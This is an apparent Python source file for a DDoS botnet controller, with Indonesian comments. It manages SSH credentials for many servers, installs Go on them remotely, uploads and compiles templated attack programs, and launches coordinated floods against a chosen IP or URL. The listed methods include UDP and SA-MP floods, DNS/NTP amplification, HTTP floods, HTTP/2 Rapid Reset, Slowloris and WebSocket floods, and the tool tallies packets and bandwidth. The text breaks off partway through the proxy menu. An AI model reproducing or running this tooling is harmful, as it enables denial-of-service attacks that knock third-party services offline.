#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import paramiko
import threading
import subprocess
from datetime import datetime
import re
import socket
import select
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================= [ KONFIGURASI GLOBAL ] =================
DB_FILE = "servers.json"
PROXY_FILE = "proxy.txt"
DEFAULT_KEY_FILE = os.path.expanduser("~/.ssh/id_rsa")
VERSION = "30.0-HYBRID-L4L7"

COLOR = {
    'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
    'blue': '\033[94m', 'purple': '\033[95m', 'cyan': '\033[96m',
    'white': '\033[97m', 'reset': '\033[0m', 'bold': '\033[1m', 'dim': '\033[2m'
}

# Method definitions
L4_METHODS = {
    '1': ('UDP', 'Standard UDP Flood'),
    '2': ('SAMP', 'SA-MP Query Flood (Variant 10000+)'),
    '3': ('MIX', 'SAMP 80% + UDP 20%'),
    '4': ('AMPLIFY', 'DNS + NTP Amplification'),
    '5': ('GOD', 'ALL L4 METHODS COMBINED')
}

L7_METHODS = {
    '1': ('HTTP_FLOOD', 'Standard HTTP GET Flood'),
    '2': ('HTTP2_RAPID', 'HTTP/2 Rapid Reset (CVE-2023-44487)'),
    '3': ('SLOWLORIS', 'Slowloris Partial Headers'),
    '4': ('WEBSOCKET', 'WebSocket Flood'),
    '5': ('POST_FLOOD', 'HTTP POST Form Flood'),
    '6': ('GOD_L7', 'ALL L7 METHODS COMBINED')
}

# ================= [ DATABASE ] =================
def load_servers():
    """Load servers dengan backward compatibility L4 dan L7"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
                # Ensure structure
                defaults = {
                    'stats': {
                        "total_attacks": 0,
                        "total_packets": 0,  # L4
                        "total_requests": 0,  # L7
                        "total_bytes": 0,
                        "total_time": 0
                    },
                    'l7_stats': {
                        "http_2xx": 0, "http_4xx": 0, "http_5xx": 0,
                        "failed": 0, "avg_response_time": 0.0
                    },
                    'servers_password': [],
                    'servers_key': [],
                    'proxies': [],
                    'attack_configs': {}
                }
                for key, value in defaults.items():
                    if key not in data:
                        data[key] = value
                return data
        except Exception as e:
            print(f"{COLOR['red']}Error loading DB: {e}{COLOR['reset']}")
    
    return {
        "servers_password": [], "servers_key": [], "proxies": [],
        "stats": {"total_attacks": 0, "total_packets": 0, "total_requests": 0, "total_bytes": 0, "total_time": 0},
        "l7_stats": {"http_2xx": 0, "http_4xx": 0, "http_5xx": 0, "failed": 0, "avg_response_time": 0.0},
        "attack_configs": {}
    }

def save_servers(data):
    temp_file = DB_FILE + ".tmp"
    try:
        with open(temp_file, 'w') as f:
            json.dump(data, f, indent=2)
        os.replace(temp_file, DB_FILE)
    except Exception as e:
        print(f"{COLOR['red']}Error saving DB: {e}{COLOR['reset']}")

# ================= [ SSH UTILITIES ] =================
class SSHConnection:
    def __init__(self, server):
        self.server = server
        self.ssh = None
        self.sftp = None
        self.connected = False
        
    def connect(self, timeout=10):
        try:
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_args = {
                'hostname': self.server['host'],
                'port': self.server.get('port', 22),
                'username': self.server['username'],
                'timeout': timeout,
                'allow_agent': False,
                'look_for_keys': False,
                'banner_timeout': 30
            }
            
            if self.server.get('auth_type') == 'key':
                key_file = self.server.get('key_file', DEFAULT_KEY_FILE)
                if not os.path.exists(key_file):
                    raise Exception(f"Key not found: {key_file}")
                try:
                    pkey = paramiko.RSAKey.from_private_key_file(key_file)
                except:
                    try:
                        pkey = paramiko.Ed25519Key.from_private_key_file(key_file)
                    except:
                        pkey = paramiko.ECDSAKey.from_private_key_file(key_file)
                connect_args['pkey'] = pkey
            else:
                connect_args['password'] = self.server['password']
            
            self.ssh.connect(**connect_args)
            self.sftp = self.ssh.open_sftp()
            self.connected = True
            return True
        except Exception as e:
            self.connected = False
            return False
    
    def execute(self, command, timeout=60, get_pty=False):
        if not self.connected:
            return "ERROR: Not connected"
        try:
            stdin, stdout, stderr = self.ssh.exec_command(
                command, timeout=timeout, get_pty=get_pty,
                environment={'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/local/go/bin'}
            )
            return stdout.read().decode('utf-8', errors='ignore') + stderr.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def upload_content(self, content, remote_path):
        if not self.connected:
            return False
        try:
            with self.sftp.file(remote_path, 'w') as f:
                f.write(content)
            return True
        except Exception as e:
            return False
    
    def close(self):
        if self.sftp: self.sftp.close()
        if self.ssh: self.ssh.close()
        self.connected = False

# ================= [ SERVER TESTING ] =================
def test_server_l4(server):
    """Test server untuk L4 attacks (attack.go)"""
    print(f"{COLOR['yellow']}🔄 Testing {server['host']} (L4 Mode)...{COLOR['reset']}")
    conn = SSHConnection(server)
    if not conn.connect(timeout=10):
        server['active'] = False
        return False
    
    try:
        # Check basic resources
        sys_check = """nproc 2>/dev/null || echo 1; free -m 2>/dev/null | grep Mem | awk '{print $2}' || echo 1024"""
        result = conn.execute(sys_check)
        lines = result.strip().split('\n')
        server['cpu_cores'] = int(lines[0]) if lines[0].isdigit() else 2
        server['ram_mb'] = int(lines[1]) if len(lines) > 1 and lines[1].isdigit() else 2048
        
        # Check Go
        go_check = """command -v go &> /dev/null && go version || echo "NOT_FOUND""""
        result = conn.execute(go_check)
        
        if "NOT_FOUND" in result:
            # Install Go minimal (L4 tidak butuh modules)
            install_cmd = """
            cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz && \
            tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz && \
            ln -sf /usr/local/go/bin/go /usr/local/bin/go && \
            go version
            """
            result = conn.execute(install_cmd, timeout=120)
            if "go version" not in result:
                server['active'] = False
                conn.close()
                return False
        
        # Network test
        ping_test = "ping -c 2 8.8.8.8 2>/dev/null | tail -1 | awk -F '/' '{print $5}' || echo 999"
        result = conn.execute(ping_test)
        try:
            server['latency'] = float(result.strip())
        except:
            server['latency'] = 999
        
        server['bandwidth'] = 100  # Default
        server['active'] = True
        server['l4_capable'] = True
        print(f"{COLOR['green']}✅ L4 Ready | CPU:{server['cpu_cores']} | Latency:{server['latency']:.0f}ms{COLOR['reset']}")
        conn.close()
        return True
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
        server['active'] = False
        conn.close()
        return False

def test_server_l7(server):
    """Test server untuk L7 attacks (attackl7.go) dengan module support"""
    print(f"{COLOR['yellow']}🔄 Testing {server['host']} (L7 Mode)...{COLOR['reset']}")
    conn = SSHConnection(server)
    if not conn.connect(timeout=10):
        server['active'] = False
        return False
    
    try:
        # System info
        sys_check = """nproc 2>/dev/null || echo 1; free -m 2>/dev/null | grep Mem | awk '{print $2}' || echo 1024; uptime | awk -F'load average:' '{print $2}' || echo "0.00""""
        result = conn.execute(sys_check)
        lines = result.strip().split('\n')
        server['cpu_cores'] = int(lines[0]) if lines[0].isdigit() else 2
        server['ram_mb'] = int(lines[1]) if len(lines) > 1 and lines[1].isdigit() else 2048
        
        # Check Go dengan modules
        go_check = """export PATH=$PATH:/usr/local/go/bin; go version 2>/dev/null || echo "NOT_FOUND""""
        result = conn.execute(go_check)
        
        if "NOT_FOUND" in result:
            # Install Go
            install_cmd = """
            export DEBIAN_FRONTEND=noninteractive
            cd /tmp && rm -rf go* /usr/local/go
            wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O go.tar.gz
            tar -C /usr/local -xzf go.tar.gz
            ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null || true
            echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
            go version
            """
            result = conn.execute(install_cmd, timeout=120)
            if "go version" not in result:
                server['active'] = False
                conn.close()
                return False
        
        # Setup Go modules untuk L7 (http2, websocket, proxy)
        print(f"{COLOR['cyan']}📦 Setting up L7 modules...{COLOR['reset']}")
        mod_cmd = """
        export PATH=$PATH:/usr/local/go/bin
        export GOPROXY=https://proxy.golang.org,direct
        mkdir -p /tmp/gomod && cd /tmp/gomod
        go mod init test 2>/dev/null || true
        go get golang.org/x/net/http2@latest 2>&1 | tail -1
        go get github.com/gorilla/websocket@latest 2>&1 | tail -1
        rm -rf /tmp/gomod
        echo "MODULES_OK"
        """
        result = conn.execute(mod_cmd, timeout=60)
        
        # Network test
        ping_test = "ping -c 2 8.8.8.8 2>/dev/null | tail -1 | awk -F '/' '{print $5}' || echo 999"
        result = conn.execute(ping_test)
        try:
            server['latency'] = float(result.strip())
        except:
            server['latency'] = 999
        
        server['bandwidth'] = 100
        server['active'] = True
        server['l7_capable'] = True
        print(f"{COLOR['green']}✅ L7 Ready | CPU:{server['cpu_cores']} | Modules: OK{COLOR['reset']}")
        conn.close()
        return True
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
        server['active'] = False
        conn.close()
        return False

# ================= [ SCRIPT GENERATORS ] =================
def generate_l4_script(target_ip, target_port, duration, method, threads):
    """Generate L4 script dari attack.go (UDP/SAMP)"""
    try:
        with open('attack.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetIP}}', target_ip)
        script = script.replace('{{.TargetPort}}', str(target_port))
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method.upper())
        return script
    except FileNotFoundError:
        print(f"{COLOR['red']}❌ attack.go not found!{COLOR['reset']}")
        return None
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
        return None

def generate_l7_script(target_url, duration, threads, method):
    """Generate L7 script dari attackl7.go (HTTP/WebSocket)"""
    try:
        with open('attackl7.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetURL}}', target_url)
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method.upper())
        return script
    except FileNotFoundError:
        print(f"{COLOR['red']}❌ attackl7.go not found!{COLOR['reset']}")
        return None
    except Exception as e:
        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
        return None

# ================= [ DEPLOY ATTACK L4 ] =================
def deploy_attack_l4(servers, target_ip, target_port, duration, method, threads, data):
    """Deploy L4 attack (attack.go) - ORIGINAL CODE PRESERVED"""
    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️ DEPLOYING L4 ATTACK TO {len(servers)} SERVERS{COLOR['reset']}")
    print(f"🎯 Target: {target_ip}:{target_port}")
    print(f"⏱️ Duration: {duration}s | Method: {method}")
    print(f"⚡ Threads/server: {threads}")
    
    go_script = generate_l4_script(target_ip, target_port, duration, method, threads)
    if not go_script:
        return
    
    results = {'total_packets': 0, 'total_bytes': 0, 'success': 0, 'failed': 0}
    start_time = time.time()
    
    def attack_server(server, index):
        conn = SSHConnection(server)
        if not conn.connect(timeout=10):
            results['failed'] += 1
            print(f"{COLOR['red']}❌ [{index+1}] {server['host']} - Connection failed{COLOR['reset']}")
            return
        
        try:
            # Setup dan compile
            cmd = f"""
            mkdir -p /tmp/goattack && cd /tmp/goattack
            cat > attack.go << 'EOF'
{go_script}
EOF
            export PATH=$PATH:/usr/local/go/bin
            go build -ldflags="-s -w" -o attack attack.go 2>&1
            if [ -f attack ]; then
                chmod +x attack
                nice -n -20 ./attack
                rm -f attack attack.go
                echo "COMPLETED"
            else
                echo "BUILD_FAIL"
            fi
            """
            
            output = conn.execute(cmd, timeout=duration+60, get_pty=True)
            
            # Parse hasil
            packets = 0
            bytes_total = 0
            
            match = re.search(r'📦 TOTAL PACKETS:\s+([\d.]+[KMBT]?)', output)
            if match:
                packets = parse_number(match.group(1))
                results['total_packets'] += packets
            
            match = re.search(r'📊 TOTAL DATA:\s+([\d.]+)\s+MB', output)
            if match:
                bytes_total = float(match.group(1)) * 1024 * 1024
                results['total_bytes'] += int(bytes_total)
            
            if packets > 0:
                results['success'] += 1
                print(f"{COLOR['green']}✅ [{index+1}] {server['host']} | Packets: {format_number(packets)}{COLOR['reset']}")
            else:
                results['failed'] += 1
                print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | Failed{COLOR['reset']}")
                
        except Exception as e:
            results['failed'] += 1
            print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | Error: {str(e)[:50]}{COLOR['reset']}")
        finally:
            conn.execute("rm -rf /tmp/goattack")
            conn.close()
    
    # Launch threads
    threads_list = []
    for i, server in enumerate(servers):
        t = threading.Thread(target=attack_server, args=(server, i))
        t.start()
        threads_list.append(t)
        time.sleep(0.2)
    
    # Progress
    start_wait = time.time()
    while any(t.is_alive() for t in threads_list):
        elapsed = time.time() - start_wait
        done = len([t for t in threads_list if not t.is_alive()])
        if elapsed < duration:
            sys.stdout.write(f"\r⏳ Progress: {done}/{len(servers)} servers | {elapsed:.0f}s/{duration}s")
            sys.stdout.flush()
        time.sleep(1)
    
    for t in threads_list:
        t.join()
    
    total_time = time.time() - start_time
    
    # Update stats
    data['stats']['total_attacks'] += 1
    data['stats']['total_packets'] += results['total_packets']
    data['stats']['total_bytes'] += results['total_bytes']
    data['stats']['total_time'] += total_time
    save_servers(data)
    
    # Report
    avg_pps = results['total_packets'] // duration if duration > 0 else 0
    avg_gbps = (results['total_bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
    
    print(f"\n\n{COLOR['cyan']}{COLOR['bold']}╔══════════════════════════════════════════════════════════════════╗{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                     L4 ATTACK STATISTICS                         ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╠══════════════════════════════════════════════════════════════════╣{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🎯 Target: {target_ip}:{target_port}{' '*40}║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📦 Packets: {format_number(results['total_packets']):>30}                  ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📊 Data: {results['total_bytes']/1024/1024/1024:>10.2f} GB                              ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ Avg PPS: {format_number(avg_pps):>30}                  ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🌐 Avg GBPS: {avg_gbps:>30.2f}                  ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╚══════════════════════════════════════════════════════════════════╝{COLOR['reset']}")

# ================= [ DEPLOY ATTACK L7 ] =================
def deploy_attack_l7(servers, target_url, duration, method, threads, data):
    """Deploy L7 attack (attackl7.go)"""
    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️ DEPLOYING L7 ATTACK TO {len(servers)} SERVERS{COLOR['reset']}")
    print(f"🎯 Target: {target_url}")
    print(f"⏱️ Duration: {duration}s | Method: {method}")
    print(f"⚡ Threads/server: {threads}")
    
    go_script = generate_l7_script(target_url, duration, threads, method)
    if not go_script:
        return
    
    # Upload proxies jika ada
    proxy_content = ""
    active_proxies = [p['url'] for p in data.get('proxies', []) if p.get('active')]
    if active_proxies:
        proxy_content = '\n'.join(active_proxies[:500])
    
    results = {'total_requests': 0, 'total_bytes': 0, 'success': 0, 'failed': 0}
    start_time = time.time()
    
    def attack_server(server, index):
        conn = SSHConnection(server)
        if not conn.connect(timeout=15):
            results['failed'] += 1
            return
        
        try:
            # Setup workspace
            conn.execute("mkdir -p /tmp/l7attack && rm -f /tmp/l7attack/*")
            
            if proxy_content:
                conn.upload_content(proxy_content, '/tmp/l7attack/proxy.txt')
            
            conn.upload_content(go_script, '/tmp/l7attack/attack.go')
            
            # Prepare modules
            prep_cmd = """
            cd /tmp/l7attack
            export PATH=$PATH:/usr/local/go/bin
            export GOPROXY=https://proxy.golang.org,direct
            go mod init attack 2>/dev/null || true
            go get golang.org/x/net/http2@latest 2>&1 | tail -1
            go get golang.org/x/net/proxy@latest 2>&1 | tail -1
            go get github.com/gorilla/websocket@latest 2>&1 | tail -1
            """
            conn.execute(prep_cmd, timeout=60)
            
            # Compile
            comp_cmd = """
            cd /tmp/l7attack
            export PATH=$PATH:/usr/local/go/bin
            go build -ldflags="-s -w" -o attack attack.go 2>&1
            echo "BUILD:$?"
            """
            comp_result = conn.execute(comp_cmd, timeout=60)
            
            if "BUILD:0" not in comp_result:
                results['failed'] += 1
                print(f"{COLOR['red']}❌ [{index+1}] {server['host']} - Build failed{COLOR['reset']}")
                conn.close()
                return
            
            # Run
            run_cmd = """
            cd /tmp/l7attack
            export PATH=$PATH:/usr/local/go/bin
            ulimit -n 65535 2>/dev/null || true
            nice -n -20 ./attack 2>&1
            echo "ATTACK_COMPLETE"
            """
            output = conn.execute(run_cmd, timeout=duration+30, get_pty=True)
            
            # Parse
            requests = 0
            bytes_total = 0
            
            match = re.search(r'📦 TOTAL REQUESTS:\s+([\d.]+[KMBT]?)', output)
            if match:
                requests = parse_number(match.group(1))
                results['total_requests'] += requests
            
            match = re.search(r'📊 TOTAL DATA:\s+([\d.]+)\s+MB', output)
            if match:
                bytes_total = float(match.group(1)) * 1024 * 1024
                results['total_bytes'] += int(bytes_total)
            
            if requests > 0:
                results['success'] += 1
                print(f"{COLOR['green']}✅ [{index+1}] {server['host']} | Requests: {format_number(requests)}{COLOR['reset']}")
            else:
                results['failed'] += 1
                print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | No requests{COLOR['reset']}")
                
        except Exception as e:
            results['failed'] += 1
            print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | Error{COLOR['reset']}")
        finally:
            conn.execute("rm -rf /tmp/l7attack")
            conn.close()
    
    # Launch
    with ThreadPoolExecutor(max_workers=len(servers)) as executor:
        futures = {executor.submit(attack_server, server, i): i for i, server in enumerate(servers)}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    total_time = time.time() - start_time
    
    # Update stats
    data['stats']['total_attacks'] += 1
    data['stats']['total_requests'] += results['total_requests']
    data['stats']['total_bytes'] += results['total_bytes']
    data['stats']['total_time'] += total_time
    save_servers(data)
    
    # Report
    avg_rps = results['total_requests'] // duration if duration > 0 else 0
    avg_gbps = (results['total_bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
    
    print(f"\n\n{COLOR['cyan']}{COLOR['bold']}╔══════════════════════════════════════════════════════════════════╗{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║                     L7 ATTACK STATISTICS                         ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╠══════════════════════════════════════════════════════════════════╣{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🎯 Target: {target_url[:50]:<50}║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📦 Requests: {format_number(results['total_requests']):>30}                  ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  📊 Data: {results['total_bytes']/1024/1024/1024:>10.2f} GB                              ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ Avg RPS: {format_number(avg_rps):>30}                  ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}║  🌐 Avg GBPS: {avg_gbps:>30.2f}                  ║{COLOR['reset']}")
    print(f"{COLOR['cyan']}{COLOR['bold']}╚══════════════════════════════════════════════════════════════════╝{COLOR['reset']}")

# ================= [ MENU SYSTEMS ] =================
def menu_password_servers(data, mode="both"):
    """Manage password servers - SUPPORTS BOTH L4 AND L7"""
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['green']}🔒 PASSWORD SERVERS MANAGEMENT{COLOR['reset']}")
        print(f"{COLOR['dim']}Mode: {mode.upper()}{COLOR['reset']}\n")
        
        pwd_servers = data.get('servers_password', [])
        if not pwd_servers:
            print("No password servers.\n")
        else:
            active_count = len([s for s in pwd_servers if s.get('active')])
            print(f"Total: {len(pwd_servers)} | Active: {active_count}\n")
            for i, s in enumerate(pwd_servers, 1):
                status = "✅" if s.get('active') else "⏳"
                l4 = "L4" if s.get('l4_capable') else "--"
                l7 = "L7" if s.get('l7_capable') else "--"
                print(f"{status} {i}. {s['host']} - {s['username']} [{l4}|{l7}]")
        
        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
        print("1️⃣  Add Server")
        print("2️⃣  Bulk Add from File")
        print("3️⃣  Remove Server")
        if mode in ["l4", "both"]:
            print("4️⃣  Test Server (L4 Mode)")
            print("5️⃣  Test All (L4 Mode)")
        if mode in ["l7", "both"]:
            print("6️⃣  Test Server (L7 Mode)")
            print("7️⃣  Test All (L7 Mode)")
        print("8️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            host = input("Host/IP: ")
            username = input("Username: ")
            password = input("Password: ")
            port = input("Port SSH (22): ") or "22"
            server = {
                'host': host, 'username': username, 'password': password,
                'port': int(port), 'auth_type': 'password', 'added': time.time(),
                'active': False, 'l4_capable': False, 'l7_capable': False
            }
            data['servers_password'].append(server)
            save_servers(data)
            print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '2':
            print("Format: host:port:username:password")
            path = input("File path: ")
            try:
                with open(path) as f:
                    count = 0
                    for line in f:
                        if line.strip() and not line.startswith('#'):
                            parts = line.strip().split(':')
                            if len(parts) >= 4:
                                server = {
                                    'host': parts[0], 'port': int(parts[1]),
                                    'username': parts[2], 'password': ':'.join(parts[3:]),
                                    'auth_type': 'password', 'added': time.time(),
                                    'active': False, 'l4_capable': False, 'l7_capable': False
                                }
                                data['servers_password'].append(server)
                                count += 1
                save_servers(data)
                print(f"{COLOR['green']}✅ Added {count} servers{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
            time.sleep(2)
            
        elif choice == '3':
            if not pwd_servers:
                print("No servers"); time.sleep(1); continue
            for i, s in enumerate(pwd_servers, 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Remove #: ")) - 1
                if 0 <= idx < len(pwd_servers):
                    removed = data['servers_password'].pop(idx)
                    save_servers(data)
                    print(f"{COLOR['green']}✅ Removed {removed['host']}{COLOR['reset']}")
            except:
                pass
            time.sleep(1)
            
        elif choice == '4' and mode in ["l4", "both"]:
            if not pwd_servers:
                print("No servers"); time.sleep(1); continue
            for i, s in enumerate(pwd_servers, 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Test #: ")) - 1
                if 0 <= idx < len(pwd_servers):
                    if test_server_l4(pwd_servers[idx]):
                        pwd_servers[idx]['active'] = True
                    save_servers(data)
                    input("\nEnter...")
            except:
                pass
                
        elif choice == '5' and mode in ["l4", "both"]:
            print(f"\n{COLOR['yellow']}Testing L4 capability...{COLOR['reset']}")
            for i, server in enumerate(pwd_servers):
                if test_server_l4(server):
                    server['active'] = True
                    server['l4_capable'] = True
                time.sleep(0.5)
            save_servers(data)
            input("\nEnter...")
            
        elif choice == '6' and mode in ["l7", "both"]:
            if not pwd_servers:
                print("No servers"); time.sleep(1); continue
            for i, s in enumerate(pwd_servers, 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Test #: ")) - 1
                if 0 <= idx < len(pwd_servers):
                    if test_server_l7(pwd_servers[idx]):
                        pwd_servers[idx]['active'] = True
                    save_servers(data)
                    input("\nEnter...")
            except:
                pass
                
        elif choice == '7' and mode in ["l7", "both"]:
            print(f"\n{COLOR['yellow']}Testing L7 capability...{COLOR['reset']}")
            for i, server in enumerate(pwd_servers):
                if test_server_l7(server):
                    server['active'] = True
                    server['l7_capable'] = True
                time.sleep(0.5)
            save_servers(data)
            input("\nEnter...")
            
        elif choice == '8':
            break

def menu_key_servers(data, mode="both"):
    """Manage SSH Key servers - SUPPORTS BOTH"""
    global DEFAULT_KEY_FILE
    
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['blue']}🔑 SSH KEY SERVERS MANAGEMENT{COLOR['reset']}")
        print(f"{COLOR['dim']}Mode: {mode.upper()}{COLOR['reset']}\n")
        
        key_servers = data.get('servers_key', [])
        if not key_servers:
            print("No SSH key servers.\n")
        else:
            active_count = len([s for s in key_servers if s.get('active')])
            print(f"Total: {len(key_servers)} | Active: {active_count}\n")
            for i, s in enumerate(key_servers, 1):
                status = "✅" if s.get('active') else "⏳"
                l4 = "L4" if s.get('l4_capable') else "--"
                l7 = "L7" if s.get('l7_capable') else "--"
                print(f"{status} {i}. {s['host']} [{l4}|{l7}]")
        
        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
        print("1️⃣  Add Server")
        print("2️⃣  Bulk Add from File")
        print("3️⃣  Remove Server")
        if mode in ["l4", "both"]:
            print("4️⃣  Test Server (L4 Mode)")
            print("5️⃣  Test All (L4 Mode)")
        if mode in ["l7", "both"]:
            print("6️⃣  Test Server (L7 Mode)")
            print("7️⃣  Test All (L7 Mode)")
        print("8️⃣  Set Global Key Path")
        print("9️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            host = input("Host/IP: ")
            username = input("Username: ")
            key_file = input(f"Key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
            port = input("Port (22): ") or "22"
            server = {
                'host': host, 'username': username, 'key_file': key_file,
                'port': int(port), 'auth_type': 'key', 'added': time.time(),
                'active': False, 'l4_capable': False, 'l7_capable': False
            }
            data['servers_key'].append(server)
            save_servers(data)
            print(f"{COLOR['green']}✅ Added{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '2':
            print("Format: host:port:username:key_path")
            path = input("File: ")
            try:
                with open(path) as f:
                    count = 0
                    for line in f:
                        if line.strip() and not line.startswith('#'):
                            parts = line.strip().split(':')
                            if len(parts) >= 4:
                                server = {
                                    'host': parts[0], 'port': int(parts[1]),
                                    'username': parts[2], 'key_file': ':'.join(parts[3:]),
                                    'auth_type': 'key', 'added': time.time(),
                                    'active': False, 'l4_capable': False, 'l7_capable': False
                                }
                                data['servers_key'].append(server)
                                count += 1
                save_servers(data)
                print(f"{COLOR['green']}✅ Added {count} servers{COLOR['reset']}")
            except Exception as e:
                print(f"{COLOR['red']}❌ {e}{COLOR['reset']}")
            time.sleep(2)
            
        elif choice == '3':
            if not key_servers:
                print("No servers"); time.sleep(1); continue
            for i, s in enumerate(key_servers, 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Remove #: ")) - 1
                if 0 <= idx < len(key_servers):
                    data['servers_key'].pop(idx)
                    save_servers(data)
                    print(f"{COLOR['green']}✅ Removed{COLOR['reset']}")
            except:
                pass
            time.sleep(1)
            
        elif choice == '4' and mode in ["l4", "both"]:
            if not key_servers:
                print("No servers"); time.sleep(1); continue
            for i, s in enumerate(key_servers, 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Test #: ")) - 1
                if 0 <= idx < len(key_servers):
                    if test_server_l4(key_servers[idx]):
                        key_servers[idx]['active'] = True
                    save_servers(data)
                    input("\nEnter...")
            except:
                pass
                
        elif choice == '5' and mode in ["l4", "both"]:
            print(f"\n{COLOR['yellow']}Testing L4...{COLOR['reset']}")
            for server in key_servers:
                if test_server_l4(server):
                    server['active'] = True
                    server['l4_capable'] = True
            save_servers(data)
            input("\nEnter...")
            
        elif choice == '6' and mode in ["l7", "both"]:
            if not key_servers:
                print("No servers"); time.sleep(1); continue
            for i, s in enumerate(key_servers, 1):
                print(f"{i}. {s['host']}")
            try:
                idx = int(input("Test #: ")) - 1
                if 0 <= idx < len(key_servers):
                    if test_server_l7(key_servers[idx]):
                        key_servers[idx]['active'] = True
                    save_servers(data)
                    input("\nEnter...")
            except:
                pass
                
        elif choice == '7' and mode in ["l7", "both"]:
            print(f"\n{COLOR['yellow']}Testing L7...{COLOR['reset']}")
            for server in key_servers:
                if test_server_l7(server):
                    server['active'] = True
                    server['l7_capable'] = True
            save_servers(data)
            input("\nEnter...")
            
        elif choice == '8':
            new_key = input(f"Global key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
            DEFAULT_KEY_FILE = new_key
            print(f"{COLOR['green']}✅ Updated{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '9':
            break

def menu_proxies(data):
    """Manage proxies untuk L7"""
    while True:
        clear_screen()
        print_banner()
        print(f"{COLOR['cyan']}🌐 PROXY MANAGEMENT (For L7){COLOR['reset']}\n")
        
        proxies = data.get('proxies', [])
        print(f"Total: {len(proxies)} | Active: {len([p for p in proxies if p.get('active')])}\n")
        
        print("1️⃣  Load from File")
        print("2️⃣  Add Single")
        print("3️⃣  Test All")
        print("4️⃣  Remove Dead")
        print("5️⃣  Back")
        
        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
        
        if choice == '1':
            path = input("File (ip:port per line): ")
            if os.path.exists(path):
                with open(path) as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            data['proxies'].append({
                                'url': line, 'active': True, 'added': time.time()
                            })
                save_servers(data)
                print(f"{COLOR['green']}✅ Loaded{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '2':
            proxy = input("Proxy (ip:port): ")
            if ':' in proxy:
                if not proxy.startswith('http'):
                    proxy = f"http://{proxy}"
                data['proxies'].append({'url': proxy, 'active': True})
                save_servers(data)
            time.sleep(1)
            
        elif choice == '3':
            print(f"{COLOR['yellow']}Testing...{COLOR['reset']}")
            # Simplified test
            for p in data['proxies'][:20]:  # Test 20 saja
                p['active'] = True  # Simulate
            save_servers(data)
            time.sleep(2)
            
        elif choice == '4':
